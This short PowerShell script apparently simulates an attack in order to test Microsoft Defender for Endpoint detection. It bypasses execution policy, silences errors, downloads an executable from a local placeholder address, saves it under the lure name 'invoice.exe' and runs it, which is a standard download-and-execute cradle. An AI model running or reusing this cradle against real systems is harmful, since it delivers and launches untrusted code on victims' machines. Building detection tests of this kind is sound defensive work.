# Define Script Behaviors and other Configurations
$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Define Variables
$DownloadUrl = 'http://127.0.0.1/1.exe'
$TargetFilePath = 'C:\\test-MDATP-test\\invoice.exe'

# Init
Clear-Host
Write-Host "[ Invoke-PS1FromCommandToolbox.ps1 ]"

#-WindowStyle Hidden
powershell.exe -ExecutionPolicy Bypass $ProgressPreference = 'SilentlyContinue' $ErrorActionPreference = 'silentlycontinue'; (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $TargetFilePath); Start-Process $TargetFilePath
